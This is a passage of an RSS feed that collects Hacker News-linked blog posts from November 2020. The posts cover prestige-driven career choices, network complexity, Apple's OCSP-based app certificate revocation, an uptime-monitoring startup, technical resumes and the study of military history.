originally became prestigious because they represented the height of excellence in the workforce at some point—something this group deeply values.</p><p>Each of the top companies within FTC once transformed their industries, inspiring the ambitious to follow suit. For example, James McKinsey <a href="https://longreads.com/2013/10/23/the-making-of-mckinsey-a-brief-history-of-management/">invented</a> managerial accounting and dramatically improved his clients' budgeting processes. Goldman employees <a href="https://www.goldmansachs.com/our-firm/history/a-brief-history-of-gs.pdf">pioneered</a> the price-to-earnings ratio, now ubiquitous in modern finance. And of course, Gates, Jobs, and other big tech founders are revered in American culture. These accomplishments earned their firms a prestigious reputation once, and they've managed to keep it ever since.</p><p>Prestige is self-reinforcing for its holders in the same way that network effects make big tech hard to topple. Namely, prestigious firms leverage their name and rigorous hiring practices to target top students for recruitment. As students see the best of their class joining these firms, the companies' reputation becomes further entrenched, attracting the next generation of talent. Prestige acts as a competitive moat for these firms and replicates itself over time.</p><h3>The Prestige Trap</h3><p>At first glance, it doesn't seem worrisome to factor prestige into one's job search. If these firms benefit so greatly from their prestige, wouldn't students also be well-served by having them on their resume? Maybe, but only if students are focusing on the right thing.</p><p>Prestige, like the social status it serves as a proxy for, is useful as a form of signaling. To the uninformed observer, it indicates that one is a member of the highly successful creative class. We assume, because we associate these firms with excellence, that possessing prestigious titles demonstrates excellence too. Furthermore, it's hard to evaluate people individually, so we often outsource our decision making and rely upon prestige as a neutral arbiter, regardless of its accuracy.</p><p>If third-parties look at prestige as an indicator of excellence, then it becomes a rough heuristic for replicating success in one's social environment. The top FTC companies represent an opportunity for elite students to become a James McKinsey or Henry Goldman in their own right. Ambitious students seek out prestige thinking it is the missing ingredient to achieving their own excellence. In reality, they have it backward—prestige <em>follows</em> excellence. Exposure to prestige can't make you successful any more than spending time around rich people can make you wealthy.<sup id="fnref-5"><a href="#fn-5">5</a></sup></p><p>Achieving prestige and excellence are not mutually exclusive. Although, one does depend upon the other. Pursuing prestige for its own sake will not lead to excellence, but the reverse can occur. When most ambitious students turn to prestige as a heuristic, they're really just trying to answer the question: "How do I become successful in life and achieve great things?" This explains why many of my peers returned from these prestigious jobs and internships, feeling more dissatisfied than before. They realized that what they were looking for was deeper and more nuanced than could be provided for by an additional resume item.</p><p>Unfortunately, optimizing for prestige is a poor source of evolutionary pressure. It is usually easier to feign excellence than for one to actually cultivate it. Getting a job at a big tech company is a very different thing than becoming an excellent software engineer. A student can find themselves with all of the trappings of success—the distinguished credentials, resume fillers, and prestigious titles—but without having achieved the true excellence they were seeking in the first place. In this way, prestige becomes a trap.</p><p>Why do top students fall for this trap and chase …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wesdesilvestro.com/the-prestige-trap">https://wesdesilvestro.com/the-prestige-trap</a></em></p>]]>
            </description>
            <link>https://wesdesilvestro.com/the-prestige-trap</link>
            <guid isPermaLink="false">hacker-news-small-sites-25093349</guid>
            <pubDate>Sat, 14 Nov 2020 16:36:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Obfuscating Complexity Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25093191">thread link</a>) | @definetheword
<br/>
November 14, 2020 | https://rule11.tech/obfuscating-complexity-considered-harmful/ | <a href="https://web.archive.org/web/*/https://rule11.tech/obfuscating-complexity-considered-harmful/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
		<p>If you are looking for a good resolution for 2020 still (I know, it’s a bit late), you can’t go wrong with this one: <em>this year, I will focus on making the networks and products I work on truly simpler. </em>Now, before you pull Tom’s take out on me—</p>
<blockquote><p><a href="https://networkingnerd.net/2019/12/27/fast-friday-keeping-up-with-the-times/">There are those that would say that what we’re doing is just hiding the complexity behind another layer of abstraction, which is a favorite saying of Russ White. I’d argue that we’re not hiding the complexity as much as we’re putting it back where it belongs – out of sight. We don’t need the added complexity for most operations.</a></p></blockquote>
<p>Three things: <em><strong>First,</strong> complex solutions are always required for hard problems.</em> If you’ve ever listened to me talk about complexity, you’ve probably seen this quote on a slide someplace—</p>
<blockquote><p><a href="https://faculty.nps.edu/dlalders/docs/AldersonDoyle-tsmca-July2010.pdf">[C]omplexity is most succinctly discussed in terms of functionality and its robustness. Specifically, we argue that complexity in highly organized systems arises primarily from design strategies intended to create robustness to uncertainty in their environments and component parts.</a></p></blockquote>
<p>You <em>cannot</em> solve hard problems—complex problems—without complex solutions. In fact, a lot of the complexity we run into in our everyday lives is a result of saying “this is too complex, I’m going to build something simpler.” <em>(here I’m thinking of a blog post I read last year that said “when we were building containers, we looked at routing and realized how complex it was… so we invented something simpler… which, of course, turned out to be more complex than dynamic routing!)</em></p>
<p><em><strong>Second,</strong> abstraction can be used the right way to manage complexity, and it can be used the wrong way to obfuscate or mask complexity.</em> The second great source of complexity and system failure in our world is we don’t abstract complexity so much as we obfuscate it.</p>
<p><em><strong>Third,</strong> abstraction is not a zero-sum game</em><strong>.</strong> If you haven’t found the tradeoffs, you haven’t looked hard enough. This is something expressed through the state/optimization/surface triangle, which you should <em>know</em> at this point.</p>
<p>Returning to the top of this post, the point is this: Using abstraction to manage complexity is fine. Obfuscation of complexity is not. Papering over complexity “just because I can” never solves the problem, any more than sweeping dirt under the rug, or papering over the old paint without bothering to fix the wall first.</p>
<p>We need to go beyond just figuring out how to make the user interface simpler, more “intent-driven,” automated, or whatever it is. We need to think of the network as a system, rather than as a collection of bits and bobs that we’ve thrown together across the years. We need to think about the modules horizontally and vertically, think about how they interact, understand how each piece works, understand how each abstraction leaks, and be able to ask hard questions.</p>
<p>For each module, we need to understand how things work well enough to ask <em>is this the right place to divide these two modules?</em> We should be willing to rethink our abstraction lines, the placement of modules, and how things fit together. Sometimes moving an abstraction point around can greatly simplify a design while increasing optimal behavior. Other times it’s worth it to reduce optimization to build a simpler mouse trap. <em>But you cannot know the answer to this question until you ask it.</em> If you’re sweeping complexity under the rug because… <em>well, that’s where it belongs…</em> then you are doing yourself and the organization you work for a disfavor, plain and simple. Whatever you sweep under the rug of obfuscation will grow and multiply. You don’t want to be around when it crawls back out from under that rug.</p>
<p>For each module, we need to learn how to ask <em>is this the right level and kind of abstraction?</em> We need to learn to ask <em>does the set of functions this module is doing really “hang together,” or is this just a bunch of cruft no-one could figure out what to do with, so they shoved it all in a black box and called it done?</em></p>
<p>Above all, we need to learn to look at the network as a system. I’ve been harping on this for so long, and yet I still don’t think people understand what I am saying a lot of times. So I guess I’ll just have to keep saying it. 😊</p>
<p>The problems networks are designed to solve are hard—therefore, networks are going to be complex. You cannot eliminate complexity, but you can learn to minimize and control it. Abstraction within a well-thought-out system is a valid and useful way to control complexity and understanding how and where to create modules at the edges of which abstraction can take place is a valid and useful way of controlling complexity.</p>
<p><strong>Don’t obfuscate. Think systemically, think about the tradeoffs, and abstract wisely.</strong></p>

	</div></div>]]>
            </description>
            <link>https://rule11.tech/obfuscating-complexity-considered-harmful/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25093191</guid>
            <pubDate>Sat, 14 Nov 2020 16:15:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Application trust is hard, but Apple does it well]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 194 (<a href="https://news.ycombinator.com/item?id=25093161">thread link</a>) | @pvachon
<br/>
November 14, 2020 | https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well | <a href="https://web.archive.org/web/*/https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="44" id="block-yui_3_17_2_1_1605368314078_14495"><div><p>On November 12, 2020 Apple released macOS Big Sur. In the hours after the release went live, somewhere in Apple's infrastructure an Online Certificate Status Protocol (OCSP) responder cried out in pain, dropping to its knees, begging for mercy as load increased beyond what it could handle. The OCSP responder slowing down, being a critical aspect of a modern public key infrastructure (PKI), makes it hard for clients of the PKI to verify the validity of identity documents. These documents, called X.509 Certificates, are attached to every verified application the user is launching on their Mac. Mayhem ensued, and after the issues were cleaned up, many questions remained about the implications of this failure. But first, let's take a look at the mechanisms involved in authenticating an application package, at the most fundamental level.</p>

<p>The X.509 is a ratified ITU specification that defines (among other things) a standard representation for documents that convey trust relationships between entities, known as Certificates. Certificates can be thought of as policy documents. Any X.509 certificate consists of</p>
<ul>
<li>a public key,</li>
<li>an indication who the certificate was issued for,</li>
<li>what actions the authority allows the certificate holder to perform,</li>
<li>the date the certificate is first valid on,</li>
<li>the date the certificate expires on,</li>
<li>metadata about how to check if the certificate has been revoked (optional, but highly recommended),</li>
<li>the authority who issued the certificate, and</li>
<li>a signature across all this metadata, from the authority.</li>
</ul>
<p>By retrieving the authority certificate, one can verify the integrity of the issued certificate. In fact, most authority certificates were issued by an even higher authority. By verifying all the way up to the root entity certificate (the "self-signed" highest level authority), it is possible to get a high degree of confidence of the provenance of the end entity certificate. Oftentimes a certain set of policy requirements must be met for an authority to issue a certificate to an end entity, or any intermediate entity. A certificate can be viewed as an embodiment of the proof that the authorities involved performed the appropriate checks to make sure all these conditions were met. If you fail these checks, an authority should not issue you a certificate!</p>
<p>The ceremony of creating these documents, how to interpret the document, how to represent the hierarchy of business trust decisions are all encoded in a certificate chain. Certificate chains are powerful concepts: they can be used to verify an authority who generated a public key, and who verified it was done to a certain standard. By reducing the scope of public keys to only keys you trust by specifying only certain root authorities you will accept certificate chains originating from, you can make a policy to reject any public keys (and thus any certificates) that were issued by a different authority.</p>
<h2 id="the-hard-part-revocation">The Hard Part: Revocation</h2>
<p>But what if, after the date the certificate is issued and before the date the certificate expires, something goes wrong? Maybe the authority decides that the entity the certificate was issued to has committed some malfeasance, and revokes their certificate. Sometimes the private key for a certificate is stolen, and so the assertions about who the party is that the certificate represents are no longer true, since an entity with the stolen key could impersonate the legitimate original party. There are numerous reasons why a certificate could be revoked.</p>
<p>One of the fantastic design attributes of X.509 is the fact that you should be able to perform X.509 certificate chain validation offline. So long as you have an accurate idea of what the current date is and what root entities you trust, it's (relatively) easy for a party to verify a certificate chain. The offline verification confers a great deal of resilience upon the system. But this revocation problem remains a challenge - for some systems you need to be able to check back with the authority who issued the certificate and ask "hey, is this assertion you made still valid?"</p>
<p>To solve this problem, there are three common mechanisms in use today. First, most authorities publish certificate revocation lists (CRLs). This list, signed by the issuing authority, can be periodically downloaded from a location specified in the certificate's metadata (say on a daily basis). When performing certificate validation, the locally downloaded copy of the CRL will provide a indication if a certificate has been revoked. These CRLs can get quite large though, and having to wait for the CRL to be refreshed for a revocation to take effect could be risky for certain applications. CRLs work for certain use cases, but the storage and update frequency trade-offs are significant.</p>
<p>Enter OCSP. When an authority offers an OCSP responder, the URL for the responder is also encoded in the certificate. A certificate verifier can make a call to the OCSP responder, with the serial number of the certificate to be verified. The OCSP responder checks against its database of revoked certificates. The OCSP responder will then respond with a simple "valid" or "revoked" to the query, and the calling party can then decide what to do with that information. Of course, this means that the OCSP responder can log each and every one of these queries, and build a very useful paper trail to help monitor user behaviour. This risk, along with the systemic resiliency challenges, led to a search for a middle ground.</p>
<p>The final mode is a variant on calling the OCSP responder. An OCSP responder can issue a short-lived, cryptographically signed document to a certificate holder. This document is "stapled" together with the certificate, and is sent to to the verifying party. So long as the time stamps match up, the recipient can assume (within some bounded risk) that the certificate is still valid, per the issuing authority. Of course, this approach only works for certain use cases (usually connectivity-oriented usage), but it does anonymize the certificate verifying parties.</p>
<p>Apple chose the second revocation model for app certificate verification. This mode has its benefits - revocation can be performed in real-time. So, if Apple finds that an app they issued a certificate to is actually malware, they can rapidly revoke this certificate and prevent the malware from running, even on machines it has already installed itself on. This does put a lot of policy control in Apple's hands. This is where you have to make a business decision as to whether or not you trust Apple to be benevolent or not.</p>

<p>A signed application is an interesting corner case in certificate validation. Certificates are valid for a certain range of dates. Additionally, applications don't involve (at least at launch time) any sort of exchange between a server and a client that can perform an OCSP lookup on your behalf. This limits the options we have.</p>
<p>The first problem is more nuanced than one might think. Should an application, signed at a specific point in time, be only launchable between the validity start/end dates of the certificate issued to sign the application? Probably not - this puts an artificial horizon on the application being valid, and if this is an app you paid a lot of money for, this might be frustrating. Implementation details might vary, but there is a concept of a trusted timestamp server, where a timestamp with a nonce is signed by a trusted authority. By integrating a trusted timestamp into the bundle of attributes cryptographically verified by the application launcher, we can reduce this problem to only needing to verify the app signing certificate was valid <em>at the time the bundle was signed</em>. So the current calendar date is irrelevant for determining this validity, but rather the date that has been bundled into the signed app is to be used.</p>
<p>The second problem limits your options for handling revocation. A CRL might be useful in a subset of cases - for example if large swaths of certificates are to be revoked. However, there are some concerns with this approach, beyond scalability and size of these revocation lists. One operational concern is that you could be leaking information about which certificates have been revoked, or providing insight into the revocation process. This could be exploited by malfeasant actors to game the certificate issuing process, or at least make it more obvious which certificates have been revoked and when, so malware developers could get more insight into the process, giving them an edge in "gaming the system."</p>
<p>Apple opted to solve this problem with an OCSP responder. So at every launch of an app (perhaps outside of some window where the OCSP response could be cached - I have not looked into this detail), macOS would dutifully check if the certificate used by the signer is still valid, per the OCSP responder. Of course, if macOS couldn't reach the OCSP responder, it would go about its merry way launching an app. After all, a computer needs to work offline, too.</p>

<p>An OCSP responder certainly would generate logs, as we discussed before. Those logs could contain the serial numbers of certificates that users had requested be checked, as well as the IP address of the requestor. Apple certainly has a database that maps a serial number back to the actual X.509 certificate, which then can likely be used to identify what app(s) this certificate was used to sign. The metadata about the request could likely be mapped back to who you are (through the power of AppleID, perhaps), the and the attributes of the certificate could be tied to your app store purchases (or lack thereof). Theoretically, this could be used to clamp down on piracy, private software distribution and other free use of a device.</p>
<p>But here is where we have to consider the user. I'm knee-deep in systems security problems, day-in and day-out. All these systems we interact with have become more complex than what most people (myself included) can maintain a mental model of. …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well">https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well</a></em></p>]]>
            </description>
            <link>https://www.security-embedded.com/blog/2020/11/14/application-trust-is-hard-but-apple-does-it-well</link>
            <guid isPermaLink="false">hacker-news-small-sites-25093161</guid>
            <pubDate>Sat, 14 Nov 2020 16:11:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Having 170 competitors in not an obstacle]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 63 (<a href="https://news.ycombinator.com/item?id=25093022">thread link</a>) | @Akcium
<br/>
November 14, 2020 | https://pingr.io/blog/having-170-competitors-is-not-an-obstacle/ | <a href="https://web.archive.org/web/*/https://pingr.io/blog/having-170-competitors-is-not-an-obstacle/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Take a look at this research <a href="https://www.supermonitoring.com/blog/website-monitoring-tools-market-in-2020/">https://www.supermonitoring.com/blog/website-monitoring-tools-market-in-2020/</a></p><p>It states that there are around 170 uptime monitoring services. Despite this fact, I decided to make another one. Before you roll your eyes, let me explain the reasons for making such a decision. At the end of the article, you'll find a comment on hacker news that answers the question.</p><p>First of all, let's accept the term that I consider people who are solo-founders who have enough time &amp; desire to make their products. I'm not talking about an investment of millions of dollars, complex financial calculations of risks/profits, creating a big company with hundreds of employees. I'm talking about small businesses.</p><p>Having such people in mind, let's see what their thoughts can be before starting a new product.</p><p>Most of them refuse to create something alleging that:</p><ul><li>They don't have a brilliant idea</li><li>They don't have enough money/time</li><li>The idea was already implemented / there are a lot of competitors in the area</li></ul><p>Let's examine these statements.</p><h3 id="no-brilliant-idea">No brilliant idea</h3><p>Let me ask: Does every successful product have a brilliant idea? Does every successful business have an idea at all? If so, <a href="https://alternativeto.net/">https://alternativeto.net/</a> didn't exist.</p><p>Everyone knows that idea worth nothing. Implementation does. Marketing does.</p><p>How often do we hear: "Gosh, why nobody solves this, isn't it obvious that people should solver this?!". But why the person who says that didn't solve it, if it's obvious?</p><p>Now, you may argue that new products appearing in the market have USP, Unique Selling Proposition. Usually, yes, however, the USP turns around the idea which was already implemented. They just enhanced it a bit but haven't invented something completely new.</p><p>There are hundreds of to-do apps that solve the task of taking notes of what a person should do.</p><p>There are hundreds of chat apps that solve the task of communicating between people.</p><p>There are hundreds of CRM apps that sole the task of handling customers.</p><h3 id="no-money-time">No money / time</h3><p>When it comes to money, I have the same question: Did every successful business have initial funding?</p><p>As for time, I would agree that this is somewhat necessary if we don't consider funding or investment. Even if we do, we still need to spend some amount of time.</p><h3 id="it-was-already-implemented">It was already implemented</h3><p>Okay, now a person has desire and time. Then, the person goes to Google and finds out that somebody already implemented the idea. Moreover, the "somebody" is a relatively large and famous company. What a pity.</p><p>But what happens if there weren't any competitors at all?</p><p>Well... the chances are that nobody needs this. But you cannot know for sure, so you need to spend time for validation.</p><p>Beware, here comes a <a href="https://en.wikipedia.org/wiki/Confirmation_bias">cognitive bias</a>: if you stick to your idea, really love it, then despite your validation process, you might keep on working on it because people tend to find arguments that sustain their opinion, not vice versa.</p><h3 id="what-others-say">What others say</h3><p>The most common objection for a person who wants to start a business starts with: "Who needs...".</p><p>This is an established human pattern.</p><ul><li>Who needs google if there is Yahoo?</li><li>Who needs dropbox if you have flash drives?</li><li>Who needs yet another... if ... already exists?</li></ul><h3 id="the-answer">The answer</h3><p>Let me show an HN comment from a post by Unsplash <a href="https://news.ycombinator.com/item?id=5794083">https://news.ycombinator.com/item?id=5794083</a></p><figure><img src="https://pingr.io/blog/content/images/2020/11/image.png" alt="" srcset="https://pingr.io/blog/content/images/size/w600/2020/11/image.png 600w, https://pingr.io/blog/content/images/size/w1000/2020/11/image.png 1000w, https://pingr.io/blog/content/images/size/w1600/2020/11/image.png 1600w, https://pingr.io/blog/content/images/2020/11/image.png 2150w" sizes="(min-width: 720px) 720px"></figure><p>Every week, every day, and every hour, a lot of new products are founded. By "products," I mean pretty much everything: a new store, a new SaaS, a new B2B company.</p><p>In most cases, something similar already exists. In most cases, you don't even have a USP (Unique Selling Proposition).</p><p>But does it mean that you:</p><ul><li>Cannot create something already exists</li><li>Cannot make it better</li><li>Cannot get revenue from it?</li></ul><p>Tell me why it's not possible to open an e-commerce shop, which would be much easier/pleasant to use. Okay, tell me why cloning the existing one won't bring some revenue?</p><p>My father sells radio receivers in 2020. Even in his case, somebody needs them.</p><h3 id="reasons">Reasons</h3><p>So why I've decided to do yet another uptime monitoring service? Because I hated the experience, I got with others &amp; because I immediately understood the idea of such services.</p><p>Stop laughing at this moment, and consider this: when Medium was created, WordPress already existed.</p><p>When yet-another-CMS is created and become famous, WordPress already existed.</p><p>Some may say: hey, but WordPress is ugly and slow. And you should host it on your hosting, while Medium is excellent, and you don't need a server for posting your articles!</p><p>Yes, exactly. I hope I'll be able to get Pingr to the same level.</p><p>I'd be like Pingdom (WordPress). But better.</p><h3 id="takeaways">Takeaways</h3><ol><li>Having high competition means that the idea was already validated for you</li><li>You can create a product without a brilliant idea</li><li>You can create a product without funding</li><li>You still need to invest much time</li></ol>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://pingr.io/blog/having-170-competitors-is-not-an-obstacle/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25093022</guid>
            <pubDate>Sat, 14 Nov 2020 15:53:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a great technical resume can do for you]]>
            </title>
            <description>
<![CDATA[
Score 204 | Comments 98 (<a href="https://news.ycombinator.com/item?id=25092880">thread link</a>) | @mcenedella
<br/>
November 14, 2020 | https://www.meetleet.com/blog/what-a-great-technical-resume-can-do-for-you | <a href="https://web.archive.org/web/*/https://www.meetleet.com/blog/what-a-great-technical-resume-can-do-for-you">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The purpose of your technical resume is to generate interview requests. A successful resume attracts more interest, from more of the companies you want to interview with, for more of the jobs you would be happy to take.</p><p>You might think of a resume as your personal summary document, covering all of your life’s work to date. But it’s better to think of your resume as a business document that helps you advertise your capabilities to a future employer.</p><p>I’ve worked with thousands of employers, published the <a href="https://www.businessinsider.com/heres-what-recruiters-look-at-during-the-6-seconds-they-spend-on-your-resume-2012-4">ground-breaking research</a> into recruiter resume review time, and written several bestsellers on resumes and other career topics. And that’s why I’m now writing <a href="https://signup.meetleet.com/">great technical resumes for free</a>. Resumes, when done right, are great help in accelerating your career.</p><p>Here are a few things a <a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">technical resume</a> is not:</p><ul><li>Not your autobiography</li><li>Not a comprehensive catalog of everything you’ve done</li><li>Not a way to make you feel good about yourself (though it might also do that)</li><li>Not an academic CV</li><li>Not where you need to explain past ‘bad situations’</li><li>Not where you need to explain why you left prior jobs</li></ul><p>No, a technical resume is none of those things. And that’s because none of those things help get you hired.</p><p>Instead, a technical resume’s primary purpose is to generate interview requests for you. It’s where you make the case to “please pick me out of the pile.”</p><p>(Secondarily, a resume is a useful page of notes to use during interviews, especially behavioral interviews. We all know how our minds can go blank during interviews and it’s useful to have something to aid your memory in those moments.)</p><p>What’s the best way to get a hiring manager or future boss to select your resume from the pile? </p><p>It’s to make it as clear as possible which types of problems you’ve solved in the past, and how well you solved them. With that information, hiring managers have the easiest time in predicting what you can do for them in the future.</p><p>Unfortunately, most technology professionals take the easy way out, and copy and paste their job description into their resume. As a result, their <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> are full of sentences that begin “Responsible for” or “Worked on” or “Assigned to.”</p><p>This is a mistake because your future employer is not going to hire you for your past <strong>responsibilities</strong>. Rather, they will hire you for your past <strong>successes</strong>. It’s your achievements and results in technology that get you promoted and elevated to ever-higher levels.</p><p>And that’s why great technical resumes focus on results, <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> and method. </p><p><strong>Results</strong>: for the technology you were working on, how did it make your company, team, or systems better? Did it increase, decrease, grow, shrink, improve, suppress, optimize, deprecate, add or remove something important for your company? For everything you’ve worked on, there was some reason you were doing it. Hopefully, that reason had to do with making things better. Share the result with your resume readers. </p><p><strong>Numbers</strong>: by how much did you make things better? As a technology professional, you’re used to numbers. We measure the success of what we do in numbers all the time: latency, loadtime, DAUs, Google score. Using numbers to describe the work you’ve done comes naturally in the field.</p><p>So the more you can use numbers to <strong>quantify</strong> how much you helped increase, decrease, grow, shrink, etc., the important metrics in your prior roles, the better and more persuasive your resume will be in getting picked out of the pile. </p><p><strong>Method</strong>: this is the technical “how I did it” part of a great technical resume. If you increased something by 50% what technologies or solutions or methodologies did you use to get there? If you shrank a different metric by 70%, what activities or behaviors or actions did you need to take to achieve this reduction?</p><p>Many technical resumes miss the results and the numbers and only list the method of how they did something. Unfortunately, that’s not as effective at attracting attention to get your resume picked out of the pile.</p><p>To demonstrate, the <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> below <strong>with</strong> <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> are much more powerful than the same bullet point <strong>without</strong> numbers.</p><ul><li>Responsible for for managing our AWS cloud services for cost, reliability and scalability.</li><li>Reduced costs 17% by decommissioning 42 ec2 instances in our AWS implementation while managing for costs, reliability and scalability.</li></ul><ul><li>Refactored our front/end experience using React.</li><li>Increased user engagement 27% by refactoring our front-end experience in React.</li></ul><p>Combining results, numbers and methods on your resume makes your experience stand out from the pile. And that’s the best way to fulfill the purpose of your resume - to get you interview requests.</p><p><a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">Great technical resumes</a> increase your chances of getting hired, and getting ahead in your career. If you’d like MeetLeet to write your technical resume for free, <a href="https://signup.meetleet.com/">sign up here</a>.</p></div></div></div></div>]]>
            </description>
            <link>https://www.meetleet.com/blog/what-a-great-technical-resume-can-do-for-you</link>
            <guid isPermaLink="false">hacker-news-small-sites-25092880</guid>
            <pubDate>Sat, 14 Nov 2020 15:34:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Military History?]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 56 (<a href="https://news.ycombinator.com/item?id=25092118">thread link</a>) | @alexpetralia
<br/>
November 14, 2020 | https://acoup.blog/2020/11/13/collections-why-military-history/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/11/13/collections-why-military-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week, I want to talk about the discipline of military history: what it is, why it is important and how I see my own place within it.  This is going to be a bit of an unusual collections post as it is less about the past itself and more about how we study the past; it is also going to be a bit unusual in that it is mostly my own personal reflections, rather than a historical argument.</p>



<p>We do quite a lot of different kinds of history here on the blog.  There is a fair bit of<a href="https://acoup.blog/2019/09/07/new-acquisitions-class-status-and-the-early-church/"> social history,</a> some <a href="https://acoup.blog/2019/12/05/collections-a-trip-through-thucydides-fear-honor-and-interest/">intellectual </a><a href="https://acoup.blog/2019/12/12/collections-a-trip-through-cicero-natural-law/">history</a>, just a<a href="https://acoup.blog/2019/05/20/new-acquisitions-elective-monarchy-and-the-future-of-westeros/"> little bit of political history</a> and an absolute <a href="https://acoup.blog/tag/organic-economy/"><em>ton</em> of economic history</a>.  Obviously, I think all of those analytical lenses (and several I have not done, of course) are very important ways of understanding the past.  But a lot of what we discuss on the blog fits, narrowly or broadly, into the realm of <strong>military history</strong>.  And I want to talk about that.</p>



<p><strong>Now I should note that I do not consider myself purely a military historian</strong> – indeed, in my experience, few historians are ‘pure’ anything and if you narrow down their specialization enough, you simply end up with, “I am a historian of things which interest me” followed by a long list of what those are.  <strong>I see myself as both an economic and military historian (of the Mediterranean world, broadly construed)</strong> and my research tends to exist in the places where those two strands meet.  Sometimes that means processes that read as non-military (if it isn’t evident I have active research projects on farming and metal production, you haven’t been here long!) and sometimes those projects are more narrowly military.  <strong>I am a firm believer that a historian must be prepared to use whatever tools are going to provide the best answers to their research questions</strong>; for my own work, that has included (basic) statistical analysis, textual close reading, economic theory, archaeology (both traditional and experimental), social history, and even some chemistry and physics.  Whatever works!  But certainly, the methods of military history are one tool in my toolbox, even when I am looking to answer questions about non-military aspects of Mediterranean antiquity.</p>



<p><strong>It is no real secret that as a discipline, military history is sometimes held in low regard by other historians</strong>.  There are a number of reasons for this.  Often it has to do with outdated views on what military history <em>is</em> and what military historians <em>do</em>.  Frequently military history, because it has a large enthusiast and amateur audience, is regarded as an amateur field (something which is not helped by publishers who push quite out reams of quite frankly substandard works of this sort) lacking in sophistication, which is not accurate, but often believed.  And perhaps most often, in my experience, <strong>these opinions serve as cover for a deeper conviction that studying militaries and warfare is icky and only done by people who <em>like</em> war</strong> (when I was a student, this opinion when it was expressed by a certain generation of scholars, now mostly retired, came with a <em>very</em> predictable dose of Vietnam-era anti-military sentiment).  Often it seems the study of military history is neglected by other historians precisely because they find the subject matter uncomfortable.</p>



<p>So I want to talk about three major things here: what military history actually is and how it is done these days, why we should study military history and finally what my experience of being a military historian (both as a scholar and a teacher) has been, particularly given that I am a life-long civilian.  </p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>What is Military History?</h2>



<p>The popular conception of military history – indeed, the conception sometimes shared even by other historians – is that it is fundamentally a field about charting the course of armies, describing ‘great battles’ and praising the ‘strategic genius’ of this or that ‘great general.’  One of the more obvious examples of this assumption – and the contempt it brings – comes out of the popular CrashCourse youtube series.  When asked by their audience to cover military history related to their coverage of <em>the American Civil War</em>, the response was <a href="https://youtu.be/25HHVDOaGeE">this video listing battles </a>and reflecting on the pointless of the exercise, as if a list of battles was all that military history was (the same series would later say that military historians <a href="https://youtu.be/rlx6ur_D51s?t=323">don’t talk about about food</a>, a truly baffling statement given the important of logistics studies to the field; certainly in my own subfield, military historians tend to talk about food more than any other kind of historian except for dedicated food historians).</p>



<p>The term for works of history in this narrow mold – all battles, campaigns and generals – is <strong>“drums and trumpets” history, a term generally used derisively</strong>.  The study of battles and campaigns emerged initially as a form of training for literate aristocrats preparing to be officers and generals; it is little surprise that they focused on aristocratic leadership as the primary cause for success or failure.  Consequently, the old ‘drums and trumpets’ histories also had a tendency to<a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/"> glory in war </a>and to glorify commanders for their ‘genius’ although this was by no means universal and works of history on conflict as far back as Thucydides and Herodotus (which is to say, as far back as there have been any) have reflected on the destructiveness and tragedy of war.  But military history, like any field, matured over time; I should note that it is <a href="https://acoup.blog/2020/02/07/collections-the-fremen-mirage-part-iiia-by-the-princess-irulan/">hardly the only field of history to have less respectable roots</a> in <a href="https://acoup.blog/2020/02/14/collections-the-fremen-mirage-part-iiib-myths-of-the-atreides/">its quite recent past</a>.  Nevertheless, as the field matured and moved beyond military aristocrats working to emulate older, more successful military aristocrats into a field of scholarly inquiry (still often motivated by the very real concern that officers and political leaders be prepared to lead in the event of conflict) the field has become far more sophisticated and its gaze has broadened to include not merely non-aristocratic soldiers, but non-soldiers more generally.</p>



